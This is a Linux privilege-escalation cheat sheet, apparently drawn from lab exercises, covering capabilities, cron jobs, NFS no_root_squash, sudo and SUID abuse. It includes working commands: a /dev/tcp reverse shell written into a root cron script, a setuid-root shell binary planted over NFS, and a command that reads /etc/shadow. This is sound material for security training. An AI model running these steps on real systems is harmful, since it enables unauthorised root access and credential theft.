# Linux Privilege Escalation Techniques

## Automated Tools

* [LinPeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
* [LinEnum](https://github.com/rebootuser/LinEnum)
* [LES](https://github.com/mzet-/linux-exploit-suggester)
* [Linux Smart Enumeration](https://github.com/diego-treitos/linux-smart-enumeration)
* [Linux Priv Checker](https://github.com/linted/linuxprivchecker)

## Capabilities

Capabilities are somewhat like SUID but more granular. A SUID bit can set a binary to have privileged access to everywhere whereas a binary with a capability set may have privileged access to just one part of the kernel (such as the ability to open raw sockets).

WIth this in mind it may be possible to perform privilege escalation by abusing a capability on a binary.

To view the capabilities on a system run the following command:

```
getcap -r / 2>/dev/null
```


Looking at the output of capability set binaries above we can compare these with [<mark style="color:red;">GTFOBins</mark>](https://gtfobins.github.io/#+capabilities) to look for privilege escalation opportunities.



As per the above image from GTFOBins we can attempt to abuse the `CAP_SETUID` capability on the `view` binary to spawn a root shell.

```bash
/home/ubuntu/view -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
```

## Cron Jobs

Cron jobs are tasks which can execute scripts on the system at predetermined times (similar to Windows Task Scheduler).

Under particular circumstances it may be possible to abuse these for privilege escalation. Any user can read the file keeping system-wide Cron jobs under `/etc/cron`.



At the bottom of the image we can see where cron jobs owned by root are executing scripts every minute (represented by a wildcard).

The abuse function for Cron jobs exist where the jobs are executed in the context of the owner or in the case of above, root. If we can modify or replace a script that is called by a Cron job, privilege escalation will be possible.

It is also important to mention the PATH that is defined in `/etc/cron`. For any scripts called by Cron that are not fully defined i.e, in the above example `antivirus.sh` is not a fully defined path, if we was to place a reverse shell file called antivirus.sh anywhere in the defined path `PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin` (Providing we have permission to any of the path) this would then be executed by Cron (as root).

Taking another example form the output the following line is of interest.

```
* * * * *  root /home/karen/backup.sh
```

This job is owned by root and points to a file in the current users home directory. Being as this is in the current users home directory the user has full permission over the file. The file can be overwritten and then when executed will run with our own code as the root user.

```
# clear the contents of the current backup.sh file
echo  > backup.sh

# echo in reverse shell code
echo "#!/bin/bash" > backup.sh
echo "sh -i >& /dev/tcp/10.14.13.184/80 0>&1" >> backup.sh
```

Wait for the job to run and a reverse shell should be caught as root.



## Kernel Exploits

The kernel on an operating system works at a low and facilitates communication and between the hardware and applications. As the kernel requires privileged permissions to function correctly a kernel exploit can often lead to an escalation of privileges.

Generally the process of kernel exploitation from an adversary perspective involves performing enumeration on the target system and depending on the version of the kernel running on the target system, perform an exploit if one is available.

Tools such as [<mark style="color:red;">Linux Exploit Suggester</mark>](https://github.com/mzet-/linux-exploit-suggester) can be used to help identify if the current OS and kernel are vulnerable to any known exploits.

## NFS

By default, NFS shares change the root user to the `nfsnobody` user, an unprivileged user account. In this way, all root-created files are owned by `nfsnobody`, which prevents uploading of programs with the setuid bit set. If `no_root_squash` is used, remote root users are able to change any file on the shared file system and leave trojaned applications for other users to inadvertently execute. [<mark style="color:red;">\[Source\]</mark>](https://access.redhat.com/documentation/en-us/red\_hat\_enterprise\_linux/4/html/security\_guide/s2-server-nfs-noroot)

{% hint style="info" %}
This attack method requires the adversary to already have shell access on the target system.
{% endhint %}

Given the above information we can check from the target system what NFS shares have `no_root_squash` enabled by reading `/etc/exports`.



From above we can see that available NFS shares from within the target system. All shares have `no_root_squash` enabled. We will be using the `/tmp` share as the example going forward.

From the adversary's perspective the NFS shares have been enumerated with `Nmap` and the attacker has discovered the shares are mountable.

```bash
nmap --script nfs-ls,nfs-statfs <IP>
```



On the adversary's attacking system a directory is created from where the target systems `/tmp` directory can be mounted

```bash
mkdir /tmp/1
sudo mount -o rw <IP>:/tmp /tmp/1 
```

From the attackers machine we can see the contents of the target system `/tmp` directory.



Next, a simple C application is created which will spawn a bash shell.

```
int main()
{ setgid(0);
  setuid(0);
  system("/bin/bash");
  return 0;
 }
```

{% hint style="info" %}
Other C payloads can be found here: [<mark style="color:red;">BookHackTricks</mark>](https://book.hacktricks.xyz/linux-unix/privilege-escalation/payloads-to-execute#c)<mark style="color:red;">.</mark>
{% endhint %}

The C code can then be compiled locally on the attackers system.

```
gcc -w shell.c -o shell
```

Then the SUID bit can be set on the shell file.

```
sudo chmod +s shell
```

Now compiled and the SUID bit set we should now see the shell file from the perspective of the target systems `/tmp` directory.



Then, executing the shell file locally on the target system should obtain a root shell.



## Sudo

Circumstances can exists where select users are given sudo rights to particular binaries instead of sudo rights for an entire system. In this way it may be possible to abuse the `sudo` function for a binary to spawn a root shell.

GTFOBins is the prime resource for finding the appropriate methods for the binaries.

**GTFOBins:** [https://gtfobins.github.io/](https://gtfobins.github.io)

```
$ sudo -l

User karen may run the following commands on ip-10-10-21-57:
    (ALL) NOPASSWD: /usr/bin/find
$
```

The above code block represents the result of checking `sudo` permissions for the current user with `sudo -l`. As shown in the code block the user karen is able to run the find binary as any user `(ALL)` without specifying a password `(NOPASSWD).`

From the following [<mark style="color:red;">link</mark>](https://gtfobins.github.io/gtfobins/find/) we can see that find can be used to spawn a root shell.



Execution shown below



***

## **SUID**

The SUID bit can be used to execute file and binaries in the context of the file owner. For example, a binary owned by root which has the SUID bit set would indicate another user is able to execute the binary in the context of root (the file owner).

The command below can be used to find binaries and files with the SUID bit set.

```
find / -type f -perm -04000 -ls 2>/dev/null
```



As we can see the from the image above the SUID bit is set on `/usr/bin/base64`. Referring to the GTFOBins link below we can see this can be used for privilege escalation on the base64 binary.

* **GTFOBins SUID:** [https://gtfobins.github.io/#+suid](https://gtfobins.github.io/#+suid)


As with the example above this can be used to read the shadow file (owned by root) where hashes can then be extracted for password cracking (as an example).

```
/usr/bin/base64 /etc/shadow | base64 --decode
```


